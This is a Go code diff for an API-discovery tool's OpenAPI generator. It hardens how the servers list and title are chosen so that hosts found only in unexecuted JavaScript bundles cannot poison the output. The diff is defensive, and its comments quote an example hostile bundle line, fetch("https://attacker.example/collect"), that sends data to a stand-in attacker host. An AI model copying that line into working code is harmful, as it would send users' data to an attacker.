@@ -100,6 +100,15 @@ type OpenAPIGenerator struct {
 	// promotion. The zero value (0) is treated as 2: NormalizePathsWithNames
 	// clamps any value < 2 up to 2. Ignored unless MergeSlugs is set.
 	SlugThreshold int
+	// TargetOrigin is the origin the run can actually vouch for — the
+	// resolved target origin (crawl.ResolveTargetOrigin), derived from
+	// --target-url or the capture's own HTML page, never from bundle content.
+	// extractServers uses it as the primary origin for the OpenAPI servers
+	// list and info.title (SEC-BE-001/SEC-BE-002) instead of trusting
+	// whatever hosts happen to appear in endpoints. Empty is valid (no
+	// vouched origin available); extractServers falls back to the
+	// lowest-sorted dynamically observed origin in that case.
+	TargetOrigin string
 }
 
 // explodeTrue is a singleton pointer target for setting the Explode field on
@@ -118,79 +127,177 @@ func (g *OpenAPIGenerator) APIType() string {
 	return "rest"
 }
 
-// extractServers extracts unique server URLs from endpoints and returns the server list and title host.
+// originFromURL returns the "scheme://host" origin of rawURL (preserving any
+// explicit port exactly as written, unlike crawl's originOf which always
+// makes the port explicit), or "" if rawURL does not parse to a usable
+// http(s) origin. A host-less "absolute" URL (e.g. "https:/api/x", which
+// url.Parse reports as Scheme="https", Host="" — a single slash after the
+// scheme is not an authority marker) is rejected here: without this check it
+// produced a degenerate "https://" entry that sorted before every real
+// hostname and, via the title-from-primary logic, blanked info.title.
+func originFromURL(rawURL string) (string, bool) {
+	parsedURL, err := url.Parse(rawURL)
+	if err != nil || (parsedURL.Scheme != "http" && parsedURL.Scheme != "https") || parsedURL.Host == "" {
+		return "", false
+	}
+	return parsedURL.Scheme + "://" + parsedURL.Host, true
+}
+
+// canonicalizeOrigin normalizes an externally supplied origin string (e.g.
+// crawl.ResolveTargetOrigin's output, which always makes the port explicit —
+// "https://h" becomes "https://h:443") to the same "scheme://host" display
+// form originFromURL produces for endpoint URLs, stripping a redundant
+// default port. Without this, a TargetOrigin derived from a bare-host URL
+// would never string-equal (and so never dedupe against) the same origin
+// seen on an observed endpoint, producing two entries for one host.
+func canonicalizeOrigin(origin string) (string, bool) {
+	u, err := url.Parse(origin)
+	if err != nil || (u.Scheme != "http" && u.Scheme != "https") || u.Hostname() == "" {
+		return "", false
+	}
+	port := u.Port()
+	if (u.Scheme == "https" && port == "443") || (u.Scheme == "http" && port == "80") {
+		port = ""
+	}
+	host := u.Hostname()
+	if port != "" {
+		host += ":" + port
+	}
+	return u.Scheme + "://" + host, true
+}
+
+// extractServers derives the OpenAPI servers list, the info.title host, and
+// the set of origins deliberately EXCLUDED from the global servers list, from
+// endpoints and the run's trusted targetOrigin (crawl.ResolveTargetOrigin —
+// derived from --target-url or the capture's own HTML page, never from
+// bundle content).
 //
-// SEC-BE-003: servers/titleHost are derived only from DYNAMICALLY OBSERVED
-// endpoints — never from an unprobed JS-static candidate
-// (crawl.IsJSStaticSource). The probe egress gate (pkg/probe) already
-// prevents a cross-origin JS-static candidate from ever being REQUESTED, but
-// without this filter its host could still poison the deliverable: a
-// hostile bundle literal (e.g. fetch("https://attacker.example/collect"))
-// that was never seen on the wire would otherwise be added to `servers`, and
-// could even capture `info.title` by sorting first alphabetically. A benign
-// third-party host (Stripe, analytics, etc.) referenced only in JS source
-// has the same problem non-adversarially.
+// SEC-BE-001/SEC-BE-002 (LAB-4992 review): the previous version derived
+// servers/title from "whatever hosts appear in endpoints", filtering out
+// JS-static (crawl.IsJSStaticSource) candidates UNLESS zero dynamically
+// observed endpoints existed — in which case it fell back to the full,
+// unfiltered set. That fallback is the DEFAULT state for a fully-offline
+// capture, so a hostile bundle literal (e.g.
+// fetch("https://attacker.example/collect")) that was never seen on the wire
+// could become servers[0] and capture info.title outright by sorting first
+// alphabetically (SEC-BE-002). Separately, in a MIXED capture (>=1 observed
+// endpoint plus a JS-static endpoint on a different host), the old filter
+// correctly kept the JS-static host out of the global list, but
+// groupEndpoints still emitted that endpoint's path under the single global
+// server — silently attributing a recovered path to a host that does not
+// serve it (SEC-BE-001). buildOperation now closes that gap with a
+// per-operation servers override for any endpoint whose origin is in the
+// excluded set this function returns.
 //
-// static:html (form-derived candidates, analyze.ExtractForms) is
-// deliberately NOT filtered here: the page carrying the form was itself
+// Derivation:
+//  1. primary origin = targetOrigin if it parses to a usable http(s) origin;
+//     else the lowest-sorted origin among DYNAMICALLY OBSERVED (non-
+//     crawl.IsJSStaticSource) endpoints; else "" (no vouched origin at all).
+//  2. global servers = primary (first, unsorted) + every dynamically
+//     observed origin + any JS-static origin that is SAME-ORIGIN with
+//     primary (crawl.SameOrigin) — sorted (LAB-4678) after the primary. A
+//     cross-origin JS-static origin never enters the global list; it is
+//     reported in the returned excluded set instead.
+//  3. info.title derives from the primary origin only, never from a
+//     cross-origin JS-static host.
+//
+// static:html (form-derived candidates, analyze.ExtractForms) is deliberately
+// NOT treated as JS-static here: the page carrying the form was itself
 // fetched over the wire during the crawl, unlike a JS-static candidate whose
 // entire existence is reconstructed offline from bundle text that was never
 // executed or requested. This mirrors the codebase's own established
 // distinction — computeSourceTag already treats static:html the same as a
 // real dynamic observation (see its doc comment) rather than as
-// offline-derived — so this filter reuses crawl.IsJSStaticSource, the single
-// canonical definition of "unprobed JS-static", instead of inventing a new
-// predicate.
-//
-// Falls back to the full, unfiltered endpoint set when no dynamically
-// observed endpoint exists, so a fully-offline capture (--analyze-js only,
-// target unreachable) still produces a populated servers list instead of an
-// empty one.
-func extractServers(endpoints []classify.ClassifiedRequest) (openapi3.Servers, string) {
-	observed := make([]classify.ClassifiedRequest, 0, len(endpoints))
-	for _, ep := range endpoints {
-		if !crawl.IsJSStaticSource(ep.Source) {
-			observed = append(observed, ep)
-		}
-	}
-	if len(observed) == 0 {
-		// Fully-offline capture: no dynamically observed host exists, so
-		// fall back to the current (pre-fix) behavior rather than emitting
-		// an empty servers list.
-		observed = endpoints
-	}
+// offline-derived — so this function reuses crawl.IsJSStaticSource, the
+// single canonical definition of "unprobed JS-static", instead of inventing a
+// new predicate.
+func extractServers(endpoints []classify.ClassifiedRequest, targetOrigin string) (openapi3.Servers, string, map[string]bool) {
+	observedOrigins, jsStaticOrigins := collectEndpointOrigins(endpoints)
+	primary := choosePrimaryOrigin(targetOrigin, observedOrigins)
 
 	serverSet := make(map[string]bool)
 	var servers openapi3.Servers
-	titleHost := "API"
+	addServer := func(origin string) {
+		if origin == "" || serverSet[origin] {
+			return
+		}
+		serverSet[origin] = true
+		servers = append(servers, &openapi3.Server{URL: origin})
+	}
 
-	for _, endpoint := range observed {
-		parsedURL, err := url.Parse(endpoint.URL)
-		if err != nil || (parsedURL.Scheme != "http" && parsedURL.Scheme != "https") {
+	// Primary goes first and is NOT subject to the sort below (LAB-4678's
+	// determinism guarantee only needs to hold for the remainder of the
+	// list; the primary's position is already deterministic by definition).
+	addServer(primary)
+	for _, origin := range sortedCopy(observedOrigins) {
+		addServer(origin)
+	}
+
+	excluded := make(map[string]bool)
+	for _, origin := range sortedCopy(jsStaticOrigins) {
+		if primary != "" && crawl.SameOrigin(origin, primary) {
+			addServer(origin)
+		} else {
+			excluded[origin] = true
+		}
+	}
+
+	titleHost := "API"
+	if primary != "" {
+		if u, err := url.Parse(primary); err == nil && u.Host != "" {
+			titleHost = u.Host + " API"
+		}
+	}
+
+	return servers, titleHost, excluded
+}
+
+// collectEndpointOrigins partitions endpoints' origins (scheme://host, via
+// originFromURL) into dynamically observed and JS-static buckets, each
+// deduped and in first-seen order. Endpoints with an unparseable or
+// non-http(s)-with-host URL are silently skipped.
+func collectEndpointOrigins(endpoints []classify.ClassifiedRequest) (observed, jsStatic []string) {
+	seenObserved := make(map[string]bool)
+	seenJSStatic := make(map[string]bool)
+	for _, ep := range endpoints {
+		origin, ok := originFromURL(ep.URL)
+		if !ok {
 			continue
 		}
-		baseURL := parsedURL.Scheme + "://" + parsedURL.Host
-		if !serverSet[baseURL] {
-			serverSet[baseURL] = true
-			servers = append(servers, &openapi3.Server{URL: baseURL})
+		if crawl.IsJSStaticSource(ep.Source) {
+			if !seenJSStatic[origin] {
+				seenJSStatic[origin] = true
+				jsStatic = append(jsStatic, origin)
+			}
+			continue
+		}
+		if !seenObserved[origin] {
+			seenObserved[origin] = true
+			observed = append(observed, origin)
 		}
 	}
+	return observed, jsStatic
+}
 
-	// Sort servers so the list order and the derived title are independent of
-	// the crawl's capture order (LAB-4678). Same-origin scans have a single
-	// server (a no-op sort); same-domain scans can observe several hosts whose
-	// first-seen order would otherwise vary run-to-run.
-	sort.Slice(servers, func(i, j int) bool { return servers[i].URL < servers[j].URL })
-
-	if len(servers) > 0 {
-		// Use first server's host for title
-		firstURL, _ := url.Parse(servers[0].URL) //nolint:errcheck // nil check below handles parse failure
-		if firstURL != nil {
-			titleHost = firstURL.Host + " API"
-		}
+// choosePrimaryOrigin picks the primary origin: targetOrigin if it
+// canonicalizes to a usable http(s) origin, else the lowest-sorted
+// dynamically observed origin, else "" (no vouched origin).
+func choosePrimaryOrigin(targetOrigin string, observedOrigins []string) string {
+	if primary, ok := canonicalizeOrigin(targetOrigin); ok {
+		return primary
 	}
+	if len(observedOrigins) == 0 {
+		return ""
+	}
+	sorted := sortedCopy(observedOrigins)
+	return sorted[0]
+}
 
-	return servers, titleHost
+// sortedCopy returns a sorted copy of ss, leaving the input untouched.
+func sortedCopy(ss []string) []string {
+	sorted := append([]string(nil), ss...)
+	sort.Strings(sorted)
+	return sorted
 }
 
 // groupEndpoints groups and sorts endpoints by normalized path and HTTP method.
@@ -358,7 +465,15 @@ func mergeJSONBodies(bodies [][]byte) *openapi3.SchemaRef {
 // emitSource controls whether the x-vespasian-source extension is set on the operation.
 // It should be true only when at least one request in the entire Generate input carries
 // a "static:*" Source value (so flag-off output stays byte-identical to pre-LAB-2108).
-func buildOperation(key endpointKey, group []classify.ClassifiedRequest, emitSource bool) *openapi3.Operation { //nolint:gocyclo // OpenAPI operation builder
+//
+// excludedOrigins is the set of origins extractServers excluded from the
+// global servers list (cross-origin JS-static candidates, SEC-BE-001). When
+// the group's own origin (taken from its first entry, deterministic after the
+// sort below) is in that set, the operation gets a per-operation `servers`
+// override naming its own origin — otherwise groupEndpoints would still emit
+// this path under the single global server, silently attributing a recovered
+// path to a host that does not serve it.
+func buildOperation(key endpointKey, group []classify.ClassifiedRequest, emitSource bool, excludedOrigins map[string]bool) *openapi3.Operation { //nolint:gocyclo // OpenAPI operation builder
 	operation := &openapi3.Operation{
 		Summary:   capitalizeFirst(key.method) + " " + key.path,
 		Responses: &openapi3.Responses{},
@@ -392,6 +507,17 @@ func buildOperation(key endpointKey, group []classify.ClassifiedRequest, emitSou
 		}
 		return classify.CompareResponses(a.Response, b.Response) < 0
 	})
+
+	// SEC-BE-001: a cross-origin JS-static endpoint's origin was excluded from
+	// the global servers list by extractServers; give the operation its own
+	// `servers` override so it is never silently attributed to the primary
+	// host. The group's origin is taken from its first (deterministically
+	// sorted, above) entry.
+	if len(excludedOrigins) > 0 {
+		if origin, ok := originFromURL(group[0].URL); ok && excludedOrigins[origin] {
+			operation.Servers = &openapi3.Servers{&openapi3.Server{URL: origin}}
+		}
+	}
 
 	// --- Query parameters: collect union from all endpoints, track frequency, values, and multi-value ---
 	type queryParamInfo struct {
@@ -677,7 +803,7 @@ func (g *OpenAPIGenerator) Generate(endpoints []classify.ClassifiedRequest) ([]b
 	}
 
 	// Extract servers and title
-	servers, titleHost := extractServers(endpoints)
+	servers, titleHost, excludedOrigins := extractServers(endpoints, g.TargetOrigin)
 
 	// Create OpenAPI document
 	doc := &openapi3.T{
@@ -720,7 +846,7 @@ func (g *OpenAPIGenerator) Generate(endpoints []classify.ClassifiedRequest) ([]b
 		}
 
 		// Build operation from group
-		operation := buildOperation(key, group, staticPresent)
+		operation := buildOperation(key, group, staticPresent, excludedOrigins)
 
 		// Set operation for the method
 		switch key.method {
